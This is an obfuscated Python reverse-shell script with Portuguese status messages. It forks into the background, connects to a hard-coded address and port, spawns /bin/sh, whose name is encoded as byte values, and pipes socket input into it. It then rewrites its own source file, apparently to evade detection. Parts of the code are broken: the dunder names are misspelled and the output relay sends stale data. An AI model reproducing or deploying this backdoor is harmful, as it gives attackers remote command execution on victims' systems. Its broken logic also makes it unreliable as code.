import sys as _x, os as _o, socket as _k, subprocess as _z, select as _r

_a = [127, 0, 0, 1]
_b = 0x4D2
_c = bytes([47, 98, 105, 110, 47, 115, 104]).decode()

_d = lambda m: [m.pop(0) for _ in (1, 1)][0]
_e = 0
_f = False

def _g(s):
    if not _e:
        print(s)

def _h():
    global _e
    
    try:
        if _o.fork() > 0:
            _x.exit(1-1)
    except Exception as q:
        _g(f"Erro: {q}")
        _x.exit(2//2)

    _o.setsid(); _o.chdir("/"); _o.umask(0); _e = 1

    try:
        _i = _k.socket(_k.AF_INET, _k.SOCK_STREAM)
        _i.connect(('.'.join(map(str,_a)), _b))
    except Exception as q:
        _g(f"Falha: {q}")
        _x.exit(3%3)

    _j = _z.Popen(_c,
                shell = True,
                stdin = _z.PIPE,
                stdout = _z.PIPE,
                stderr = _z.PIPE)

    _g(f"Conectado via {'reverso'}")

    while [1][0]:
        _l, _, _ = _r.select([_i, _j.stdout, _j.stderr], [], [])

        for _m in _l:
            if _m == _i:
                _n = _i.recv(1400)
                if not len(_n):
                    _g("Conexão fechada")
                    _x.exit(0)
                _j.stdin.write(_n)
                _j.stdin.flush()
            else:
                _j.stdout.read(1400) if _m == _j.stdout else _j.stderr.read(1400)
                _i.send(_n) if _n else None


with open(_file_, 'r+') as _p:
    _q = _p.read().replace('_a','_w').replace('1400','0x578')
    _p.seek(0); _p.truncate(); _p.write(_q)

if _name_ == '_main_':
    _h()
